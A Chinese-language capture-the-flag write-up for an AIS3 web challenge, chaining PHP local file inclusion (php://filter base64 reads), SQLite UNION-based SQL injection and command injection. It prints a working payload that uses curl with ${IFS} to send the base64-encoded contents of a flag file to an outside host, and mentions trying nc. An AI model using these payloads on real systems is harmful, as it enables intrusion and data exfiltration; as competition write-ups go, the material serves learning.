# Web3
` 這題Writeup不寫，我會對不起我自己 `

## PHP LFI 
先看參數中可以發現有一個module，用 ./modules/api 和 ../html/modules/api 發現都可以
=> 想到有LFI
利用LFI將所有網頁拉下來，建立網站架構
(經典 php://filter/convert.base64-encode/resource=)
=> 發現config.php => 統神搬火鍋 ...?

* 原本想說能用傳統的 %00 來截斷include，結果是PHP7.4.19 
* 原本想說include外部php，結果allow_include_url沒開
## SQLi
後來花了很多時間在SQLi上，構建id的payload
"""sql
-1 UNION SELECT 'name','tbl_name','type' from sqlite_master;
"""
這裡要注意一個我踩過的坑，就是前面只有選三個column，你也要讓union後面也只有select三個column
經過整個Database的探勘，發現根本沒flag，所以放棄==

## CMDi
讓SQLi跟CMDi結合，構建CMDi的payload
"""sql
-1 UNION SELECT 'Customer',"'${IFS};curl${IFS}x.sivir.pw?$(cat${IFS}/flag_81c015863174cd0c14034cc60767c7f5${IFS}|base64);'",'5900' from sqlite_master;
"""
後來在網路上查到union select好像可以自己搞個Value出來，所以就能夠建CMDi
"""sql
-1 UNION SELECT 'Value1','Value2','Value3' from sqlite_master;
"""
最後一直搞不定IFS，所以跑去寫Colors了
但後來在最後10分鐘的時候，我再回來看這一題，構建了payload
原本要用nc跟T22Server連接，結果發現好像不太行
就改成在裡面打指令，先ls找一下flag結果找不到 :rage:
最後去翻 / 才有，就找到flag了

> 這題真的很機車 = = 

Flag: `AIS3{o1d_skew1_w3b_tr1cks_co11ect10n_:D}`
